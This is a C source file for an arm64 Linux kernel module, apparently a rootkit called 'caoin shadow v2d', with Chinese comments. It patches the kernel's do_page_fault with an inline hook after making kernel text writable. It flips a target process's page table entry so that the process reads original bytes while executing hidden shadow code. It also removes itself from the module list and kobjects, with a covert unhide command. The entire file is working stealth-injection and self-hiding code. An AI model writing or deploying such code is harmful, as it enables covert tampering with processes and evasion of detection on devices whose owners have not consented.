/*
 * caoin shadow v2d — 路线乙：幽灵 LKM + do_page_fault inline hook + PTE 跷跷板
 *
 * 取代 v2c 的 VBAR 换表（per-CPU 寄存器敌不过 idle 恢复，sysrq 铁证）。
 * 保留：幽灵模块（零内核符号引用 + 加载即隐）、probe 引擎、locate、
 *       PTE 读写分离跷跷板（2 态）、自隐藏/解隐藏 + fail-safe。
 * 新增：do_page_fault 入口 16B inline hook。
 *
 * hook 结构：
 *   dpf 序言 4 条指令（sub/stp/add/str，init 时 probe 校验，非 PC 相对可照抄）
 *   → 覆写为 ldr x16,[pc,#8]; br x16; .quad caoin_pf_entry
 *   → caoin_pf_entry: 存 LR → bl caoin_pf_hook（C 过滤器）
 *       handled:  恢复 LR → ret（el0_da 的 ret_to_user → eret 重执行）
 *       未命中:   恢复 LR → 照抄的序言 4 条 → 跳 do_page_fault+16
 *
 * PTE 跷跷板（2 态，fault 驱动，eret 重执行的访问类型每次不同 → 无死循环）：
 *   SHADOW（--x，含 16B 跳桩）：数据读 fault → 切 ORIG（r-- UXN）
 *   ORIG（r-- UXN）：取指 fault → 切 SHADOW
 *
 * 内核 text 补丁：ttbr1_el1 取内核 PGD → walk text VA → 翻 PTE_RDONLY
 *   → stop_machine 保护下写 16B → 恢复 RO → dc cvau/ic ivau。
 *
 * 自隐藏/解隐藏：同 v2c，新增 fail-safe（目标死亡自动挂回）。
 */
#include <linux/module.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <linux/timer.h>
#include <asm/pgtable.h>

#undef PAGE_OFFSET
#define PAGE_OFFSET 0xffffffC000000000UL

#define CAOIN_CFG_MAGIC 0xCA03CA03CA03CA03ULL
#define CAOIN_CFG_MARKER 0xDEADCA03DEADCA03ULL

#define PTE_AP_MASK    0xC0UL
#define PTE_RDONLY     (1UL << 7)
#define PTE_UXN        (1UL << 54)
#define CAOIN_PFN_MASK 0x0000FFFFFFFFF000UL

#define VIEW_ORIG    0UL
#define VIEW_SHADOW  1UL

struct caoin_cfg {
    u64 marker, magic;
    u64 target_pid;
    u64 target_va;
    u64 shadow_phys;
    u64 expect_phys;
    u64 status_va;
    u64 find_task, probe_read, printk;
    u64 status_phys;
    u64 p_probe_write;
    u64 dpf_addr;      /* do_page_fault 地址 */
    u64 stop_machine;  /* stop_machine 地址 */
    u64 kobject_del;
    u64 t_init, t_mod, t_del;
    u64 jiffies_addr;
    u64 unused[1];
    /* 运行态 */
    u64 orig_pte;
    u64 mm_off, pgd_off;
    u64 pte_addr;
    u64 shadow_pte_val;
    u64 origview_pte_val;
    volatile u64 cur_view;
    u64 mm_run;
    u64 saved_prev;
    volatile u64 hidden;
    volatile u64 hook_on;
    u64 dpf_orig[2];
};

static struct caoin_cfg caoin_cfg_block = {
    .marker = CAOIN_CFG_MARKER,
    .magic = 0,
};

static int (*caoin_printk)(const char *fmt, ...);
#define CK_LOG(...) do { if (caoin_printk) caoin_printk(__VA_ARGS__); } while (0)

/* ---- 自研 extable 安全读写（取代 probe_kernel_read/write） ----
 * probe_kernel_read 内部走 copy_from_user + KERNEL_DS，会命中 hardened
 * usercopy 的 check_object_size：locate 盲扫非线性映射/跨界 slab 指针时
 * virt_to_head_page 直接 oops（实测）。extable 版：垃圾地址 fault→fixup
 * →返回错误，天然安全，且零符号依赖。 */
static inline int caoin_rd64(unsigned long src, void *out)
{
    u64 val;
    int err;

    /* arm64 4.9 extable = 32 位相对偏移对（insn, fixup），相对本 entry */
    asm volatile(
    "1: ldr %0, [%2]\n"
    "   mov %w1, #0\n"
    "   b   3f\n"
    "2: mov %w1, #1\n"
    "3:\n"
    "   .pushsection __ex_table, \"a\"\n"
    "   .balign 4\n"
    "   .word 1b - ., 2b - .\n"
    "   .popsection\n"
    : "=r"(val), "=r"(err)
    : "r"(src)
    : "memory");
    *(u64 *)out = val;
    return err;
}

static inline int caoin_wr64(unsigned long dst, u64 val)
{
    int err;

    asm volatile(
    "1: str %1, [%2]\n"
    "   mov %w0, #0\n"
    "   b   3f\n"
    "2: mov %w0, #1\n"
    "3:\n"
    "   .pushsection __ex_table, \"a\"\n"
    "   .balign 4\n"
    "   .word 1b - ., 2b - .\n"
    "   .popsection\n"
    : "=r"(err)
    : "r"(val), "r"(dst)
    : "memory");
    return err;
}

static void caoin_tlb_flush(unsigned long va)
{
    unsigned long addr = va >> 12;
    /* vaae1is：VA + 所有 ASID（本模块 ASID 与目标不同） */
    asm volatile("dsb ish" ::: "memory");
    asm volatile("tlbi vaae1is, %0" :: "r"(addr));
    asm volatile("isb" ::: "memory");
}

/* ---- 探测引擎 ---- */

static int caoin_probe_walk(unsigned long mm_cand, unsigned long pgd_off_cand,
                            unsigned long va, unsigned long expect_phys,
                            unsigned long *pte_a_out)
{
    unsigned long pgd_p, e0, e2, pte_v, pte_a;

    if (caoin_rd64(mm_cand + pgd_off_cand, &pgd_p))
        return 0;
    if (pgd_p < PAGE_OFFSET || (pgd_p & 0xFFF))
        return 0;
    if (caoin_rd64(pgd_p + ((va >> 30) & 0x1FF) * 8, &e0))
        return 0;
    if (!(e0 & CAOIN_PFN_MASK))
        return 0;
    if (caoin_rd64(__va((e0 & CAOIN_PFN_MASK) + ((va >> 21) & 0x1FF) * 8), &e2))
        return 0;
    if (!(e2 & CAOIN_PFN_MASK))
        return 0;
    pte_a = (unsigned long)__va((e2 & CAOIN_PFN_MASK) + ((va >> 12) & 0x1FF) * 8);
    if (caoin_rd64(pte_a, &pte_v))
        return 0;
    if (expect_phys && (pte_v & CAOIN_PFN_MASK) != expect_phys)
        return 0;
    if (pte_a_out)
        *pte_a_out = pte_a;
    return 1;
}

static int caoin_locate(unsigned long task, unsigned long va, unsigned long expect_phys,
                        unsigned long va2, unsigned long expect2,
                        unsigned long *mm_off_out, unsigned long *pgd_off_out,
                        unsigned long *mm_out, unsigned long *pte_a_out)
{
    unsigned long mm_c, pgd_p, moff, poff;
    for (moff = 0; moff < 0x1800; moff += 8) {
        if (caoin_rd64(task + moff, &mm_c))
            continue;
        if (mm_c < PAGE_OFFSET || (mm_c & 0x7))
            continue;
        for (poff = 0x20; poff < 0x400; poff += 8) {
            if (caoin_rd64(mm_c + poff, &pgd_p))
                continue;
            if (pgd_p < PAGE_OFFSET || (pgd_p & 0xFFF))
                continue;
            if (caoin_probe_walk(mm_c, poff, va, expect_phys, pte_a_out)
                && caoin_probe_walk(mm_c, poff, va2, expect2, 0)) {
                *mm_off_out = moff;
                *pgd_off_out = poff;
                if (mm_out)
                    *mm_out = mm_c;
                return 1;
            }
        }
    }
    return 0;
}

static void caoin_write_status2(unsigned long mm, unsigned long pgd_off,
                                unsigned long va, u64 val)
{
    unsigned long pte_a = 0, pte_v, phys;
    if (!caoin_probe_walk(mm, pgd_off, va, 0, &pte_a))
        return;
    if (caoin_rd64(pte_a, &pte_v))
        return;
    phys = pte_v & CAOIN_PFN_MASK;
    caoin_wr64(__va(phys + (va & ~PAGE_MASK)), val);
    asm volatile("dsb ish" ::: "memory");
}

/* ---- 自隐藏 ---- */

#define CAOIN_UNHIDE_CMD  0xCA0F0001ULL
#define CAOIN_UNHIDE_ACK  0xCA0F0002ULL

static struct timer_list caoin_unhide_timer;
static void (*caoin_tinit)(void *, unsigned int, const char *, void *);
static int (*caoin_tmod)(void *, unsigned long);
static int (*caoin_tdel)(void *);
static volatile unsigned long *caoin_jp;

static void caoin_relist(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    if (c->hidden != 1)
        return;
    c->hidden = 2;
    list_add(&THIS_MODULE->list,
             (struct list_head *)(unsigned long)c->saved_prev);
    caoin_write_status2(c->mm_run, c->pgd_off,
                        (unsigned long)c->status_va, CAOIN_UNHIDE_ACK);
    CK_LOG("caoin2d: relisted\n");
}

static void caoin_unhide_tick(unsigned long arg)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned long pte_a = 0, pte_v;
    u64 cmd = 0, *slot;
    static int walk_fail_cnt;

    if (c->hidden == 1 && c->mm_run) {
        if (caoin_probe_walk(c->mm_run, c->pgd_off,
                             (unsigned long)c->status_va, 0, &pte_a)
            && !caoin_rd64(pte_a, &pte_v)) {
            walk_fail_cnt = 0;
            slot = (u64 *)__va((pte_v & CAOIN_PFN_MASK) +
                               ((unsigned long)c->status_va & ~PAGE_MASK));
            if (!caoin_rd64((unsigned long)slot, &cmd)) {
                if (cmd != CAOIN_UNHIDE_ACK) {
                    CK_LOG("caoin2d: tick cmd=%lx\n", cmd);
                    if (cmd == CAOIN_UNHIDE_CMD)
                        caoin_relist();
                }
            }
        } else {
            /* fail-safe：目标死亡 → status 页 walk 不到 → 自动挂回 */
            if (++walk_fail_cnt > 10) {
                CK_LOG("caoin2d: target gone, fail-safe relist\n");
                caoin_relist();
            }
        }
    }
    if (caoin_tmod && caoin_jp)
        caoin_tmod(&caoin_unhide_timer, *caoin_jp + HZ);
}

/* ---- do_page_fault hook ---- */

/* dpf 序言 4 条指令（4.9.337 本构建实测，init 时 probe 校验） */
static const u32 caoin_dpf_prologue[4] = {
    0xd101c3ff,   /* sub  sp, sp, #0x70 */
    0xa9017bfd,   /* stp  x29, x30, [sp, #16] */
    0x910043fd,   /* add  x29, sp, #0x10 */
    0xf90013fb,   /* str  x27, [sp, #32] */
};

/* 过滤器：返回 1 = 已处理（跳过原 do_page_fault），0 = 走原函数 */
static long caoin_pf_filter(unsigned long addr, unsigned int esr)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned int ec = esr >> 26;

    if ((addr >> 12) != ((unsigned long)c->target_va >> 12))
        return 0;

    {
        static u64 flt_n;
        if (flt_n < 30)
            CK_LOG("caoin2d: flt#%llu v=%lu ec=%x dfsc=%x far=%lx\n",
                   flt_n, c->cur_view, ec, esr & 0x3f, addr);
        flt_n++;
    }

    /* SHADOW（--x）：EL0 数据读 fault → 切 ORIG（r-- UXN） */
    if (c->cur_view == VIEW_SHADOW &&
        ec == 0x24 && !(esr & (1 << 6))) {
        set_pte((pte_t *)(unsigned long)c->pte_addr,
                __pte((unsigned long)c->origview_pte_val));
        c->cur_view = VIEW_ORIG;
        caoin_tlb_flush((unsigned long)c->target_va);
        return 1;
    }
    /* ORIG（r-- UXN）：EL0 取指 fault → 切 SHADOW */
    if (c->cur_view == VIEW_ORIG && ec == 0x20) {
        set_pte((pte_t *)(unsigned long)c->pte_addr,
                __pte((unsigned long)c->shadow_pte_val));
        c->cur_view = VIEW_SHADOW;
        caoin_tlb_flush((unsigned long)c->target_va);
        return 1;
    }
    return 0;
}

/* C 过滤器入口（签名同 do_page_fault）：handled 返回 1。
   非 static：顶层 asm 的 bl 需要模块符号表可解析 */
long caoin_pf_hook(unsigned long addr, unsigned int esr, void *regs)
{
    if (caoin_pf_filter(addr, esr))
        return 1;
    return 0;
}

/* 汇编入口：dpf 的 16B 补丁跳到这里。x0=addr w1=esr x2=regs；x30=el0_da 续接 */
asm(
".text\n"
".balign 8\n"
".global caoin_pf_entry\n"
"caoin_pf_entry:\n"
"    stp x29, x30, [sp, #-16]!\n"
"    bl  caoin_pf_hook\n"
"    cbnz w0, 1f\n"
    /* 未命中：恢复调用现场，照抄原序言 4 条，跳 dpf+16 */
"    ldp x29, x30, [sp], #16\n"
"    sub  sp, sp, #0x70\n"
"    stp  x29, x30, [sp, #16]\n"
"    add  x29, sp, #0x10\n"
"    str  x27, [sp, #32]\n"
"    ldr  x16, =caoin_dpf_resume\n"
"    br   x16\n"
"1:\n"
"    ldp x29, x30, [sp], #16\n"
"    ret\n"
".balign 8\n"
".global caoin_dpf_resume\n"
"caoin_dpf_resume:\n"
"    nop\n"
);

extern char caoin_pf_entry[];

/* ---- text 补丁（自旋窗法，不用 stop_machine） ----
 * stop_machine 在 folkpatch 内核上会挂死（次核不响应 stop IPI → 硬锁 →
 * 看门狗复位，无 ramoops）。自旋窗法：
 *   1) dpf+0 写 `b .`（0x14000000）——此间到达的 fault 在旧 icache 上自旋
 *   2) dpf+8 写 .quad entry（此时无人在 +8 之后执行，安全）
 *   3) dpf+0 单次 8 字节原子写（ldr+br 对）——自旋核经 ic ivau 失效后
 *      重取指进入 hook。无停机窗口。 */

static u64 sm_target;
static int sm_write;

static void caoin_sm_patch_now(void)
{
    u64 *p = (u64 *)sm_target;
    unsigned long off;

    if (sm_write) {
        p[0] = 0x14000000ULL;                                 /* b . */
        asm volatile("dsb ish" ::: "memory");
        p[1] = (u64)(unsigned long)caoin_pf_entry;            /* .quad entry */
        p[0] = ((u64)0xd61f0200ULL << 32) | 0x58000050ULL;    /* ldr+br 原子 8B */
    } else {
        p[0] = 0x14000000ULL;                                 /* b . */
        asm volatile("dsb ish" ::: "memory");
        p[1] = caoin_cfg_block.dpf_orig[1];                   /* 原指令 3-4 */
        p[0] = caoin_cfg_block.dpf_orig[0];                   /* 原指令 1-2 原子 8B */
    }
    asm volatile("dsb ish" ::: "memory");
    for (off = 0; off < 16; off += 64) {
        asm volatile("dc cvau, %0" :: "r"(sm_target + off));
        asm volatile("ic ivau, %0" :: "r"(sm_target + off));
    }
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");
}

/* 内核 text PTE 翻 RO/RW：ttbr1_el1 取内核 PGD → walk。
   关键：内核 image 可能以 2MB block 映射——L2 entry 是 block 描述符时，
   "PTE" 就是 L2 entry 本身（改属性作用于整个 2MB，微秒级窗口可接受） */
static int caoin_text_set_ro(unsigned long va, int ro)
{
    unsigned long ttbr1, pgd_p, e0, e2, pte_a, pte_v;

    asm volatile("mrs %0, ttbr1_el1" : "=r"(ttbr1));
    pgd_p = ttbr1 & CAOIN_PFN_MASK;
    if (!pgd_p)
        return -1;
    pgd_p = (unsigned long)__va(pgd_p);
    if (caoin_rd64(pgd_p + ((va >> 30) & 0x1FF) * 8, &e0))
        return -1;
    if (!(e0 & CAOIN_PFN_MASK))
        return -1;
    pte_a = (unsigned long)__va((e0 & CAOIN_PFN_MASK) + ((va >> 21) & 0x1FF) * 8);
    if (caoin_rd64(pte_a, &e2))
        return -1;
    if (!(e2 & 1))
        return -1;
    if ((e2 & 2) == 0) {
        /* L2 block（2MB section）：属性就在本 entry，直接改 */
        pte_v = e2;
    } else {
        /* L2 table → walk L3 */
        pte_a = (unsigned long)__va((e2 & CAOIN_PFN_MASK) + ((va >> 12) & 0x1FF) * 8);
        if (caoin_rd64(pte_a, &pte_v))
            return -1;
        if (!(pte_v & 1))
            return -1;
    }
    if (ro)
        pte_v |= PTE_RDONLY;
    else
        pte_v &= ~PTE_RDONLY;
    *(volatile u64 *)pte_a = pte_v;
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");
    return 0;
}

static long caoin_text_patch(int write)
{
    long ret = 0;

    sm_target = caoin_cfg_block.dpf_addr;
    sm_write = write;
    if (write && caoin_text_set_ro(sm_target, 0)) {
        CK_LOG("caoin2d: text pte rw fail\n");
        return -EIO;
    }
    caoin_sm_patch_now();
    if (write)
        caoin_text_set_ro(sm_target, 1);   /* 恢复 RO */
    return ret;
}

/* ---- 入口 ---- */

static int __init caoin_init(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned long mm_off, pgd_off, mmv, pte_a, orig_pte_v;
    struct task_struct *(*find_task)(int);
    struct task_struct *task;
    u64 got[2] = {0, 0};

    CK_LOG("caoin2d: init enter magic=%llx pid=%llu dpf=%lx sm=%lx\n",
           (unsigned long long)c->magic, (unsigned long long)c->target_pid,
           (unsigned long)c->dpf_addr, (unsigned long)c->stop_machine);

    if (c->magic != CAOIN_CFG_MAGIC || !c->find_task ||
        !c->dpf_addr || !c->stop_machine) {
        CK_LOG("caoin2d: cfg invalid\n");
        return -EINVAL;
    }

    caoin_printk = (void *)(unsigned long)c->printk;
    find_task = (void *)(unsigned long)c->find_task;
    task = find_task((int)c->target_pid);
    if (!task) {
        CK_LOG("caoin2d: find_task fail\n");
        return -ESRCH;
    }

    if (!caoin_locate((unsigned long)task, (unsigned long)c->target_va,
                      (unsigned long)c->expect_phys,
                      (unsigned long)c->status_va, (unsigned long)c->status_phys,
                      &mm_off, &pgd_off, &mmv, &pte_a)) {
        CK_LOG("caoin2d: locate fail\n");
        return -ENOENT;
    }
    c->mm_off = mm_off;
    c->pgd_off = pgd_off;
    c->pte_addr = pte_a;
    c->mm_run = mmv;
    caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x5);
    CK_LOG("caoin2d: combo locked mm=%lx pgd=%lx pte=%lx\n", mm_off, pgd_off, pte_a);

    if (caoin_rd64(pte_a, &orig_pte_v))
        return -ENOENT;
    c->orig_pte = orig_pte_v;

    c->shadow_pte_val = (orig_pte_v & ~(CAOIN_PFN_MASK | PTE_AP_MASK | PTE_UXN))
                      | ((unsigned long)c->shadow_phys & CAOIN_PFN_MASK)
                      | 0x80UL;                 /* AP=10: EL0 数据访问 fault */
    c->origview_pte_val = (orig_pte_v & ~(PTE_AP_MASK | PTE_UXN))
                        | 0x40UL | PTE_UXN;     /* AP=01 RO, UXN=1 */

    /* ---- dpf 序言校验 ---- */
    if (caoin_rd64(c->dpf_addr, &got[0]) ||
        caoin_rd64(c->dpf_addr + 8, &got[1])) {
        CK_LOG("caoin2d: dpf read fail\n");
        return -ENOENT;
    }
    if (got[0] != ((u64)caoin_dpf_prologue[1] << 32 | caoin_dpf_prologue[0]) ||
        got[1] != ((u64)caoin_dpf_prologue[3] << 32 | caoin_dpf_prologue[2])) {
        CK_LOG("caoin2d: dpf prologue mismatch got %llx/%llx\n",
               (unsigned long long)got[0], (unsigned long long)got[1]);
        return -EINVAL;
    }
    c->dpf_orig[0] = got[0];
    c->dpf_orig[1] = got[1];
    CK_LOG("caoin2d: dpf prologue ok\n");

    /* ---- text 补丁（二分实验：CAOIN_NO_TEXT_PATCH 跳过补丁） ---- */
#ifndef CAOIN_NO_TEXT_PATCH
    if (caoin_text_patch(1)) {
        CK_LOG("caoin2d: text patch fail\n");
        return -EIO;
    }
#else
    CK_LOG("caoin2d: text patch SKIPPED (bisection)\n");
#endif
    /* 校验补丁落地：dpf 前 16B 应为 ldr/br + entry 地址 */
    {
        u64 v0 = 0, v1 = 0;
        caoin_rd64(c->dpf_addr, &v0);
        caoin_rd64(c->dpf_addr + 8, &v1);
        if (v0 != ((u64)0xd61f0200ULL << 32 | 0x58000050ULL) ||
            v1 != (u64)(unsigned long)caoin_pf_entry) {
            CK_LOG("caoin2d: PATCH NOT LANDED v0=%llx v1=%llx want entry=%lx\n",
                   (unsigned long long)v0, (unsigned long long)v1,
                   (unsigned long)caoin_pf_entry);
            caoin_text_patch(0);
            return -EIO;
        }
        CK_LOG("caoin2d: patch landed v1=%llx\n", (unsigned long long)v1);
    }
    c->hook_on = 1;
    CK_LOG("caoin2d: dpf hooked\n");

    /* ---- 切 shadow 视图（二分实验：NOPATCH 版连 PTE 也不切） ---- */
#ifndef CAOIN_NO_TEXT_PATCH
    set_pte((pte_t *)(unsigned long)c->pte_addr,
            __pte((unsigned long)c->shadow_pte_val));
    c->cur_view = VIEW_SHADOW;
    caoin_tlb_flush((unsigned long)c->target_va);
#endif
    caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x7);
    CK_LOG("caoin2d: on (dpf hooked, shadow view)\n");

    /* ---- 自隐藏 ---- */
    if (c->kobject_del && c->t_init && c->t_mod && c->t_del && c->jiffies_addr) {
        void (*kdel)(void *) = (void *)(unsigned long)c->kobject_del;
        caoin_tinit = (void *)(unsigned long)c->t_init;
        caoin_tmod = (void *)(unsigned long)c->t_mod;
        caoin_tdel = (void *)(unsigned long)c->t_del;
        caoin_jp = (volatile unsigned long *)(unsigned long)c->jiffies_addr;
        c->saved_prev = (u64)(unsigned long)THIS_MODULE->list.prev;
        kdel(&THIS_MODULE->mkobj.kobj);
        list_del(&THIS_MODULE->list);
        c->hidden = 1;
        caoin_tinit(&caoin_unhide_timer, 0, 0, 0);
        caoin_unhide_timer.function = caoin_unhide_tick;
        caoin_tmod(&caoin_unhide_timer, *caoin_jp + HZ);
        caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x8);
        CK_LOG("caoin2d: hidden (prev=%lx)\n", (unsigned long)c->saved_prev);
    }
    return 0;
}

static void __exit caoin_exit(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    if (caoin_tdel)
        caoin_tdel(&caoin_unhide_timer);
    if (c->magic != CAOIN_CFG_MAGIC || !c->pte_addr)
        return;

    /* ---- 解除 dpf hook ---- */
    if (c->hook_on) {
        caoin_text_patch(0);
        c->hook_on = 0;
        CK_LOG("caoin2d: dpf unhooked\n");
    }

    /* ---- 视图合一 ---- */
    set_pte((pte_t *)(unsigned long)c->pte_addr,
            __pte((unsigned long)c->orig_pte));
    c->cur_view = VIEW_ORIG;
    caoin_tlb_flush((unsigned long)c->target_va);

    /* ---- status 收尾 ---- */
    {
        struct task_struct *(*find_task)(int) =
            (void *)(unsigned long)c->find_task;
        struct task_struct *task = find_task((int)c->target_pid);
        if (task) {
            unsigned long mmv = 0;
            caoin_rd64((unsigned long)task + c->mm_off, &mmv);
            if (mmv)
                caoin_write_status2(mmv, c->pgd_off,
                                    (unsigned long)c->status_va, 0xF);
        }
    }
    CK_LOG("caoin2d: off, restored\n");
}

module_init(caoin_init);
module_exit(caoin_exit);
MODULE_LICENSE("GPL");
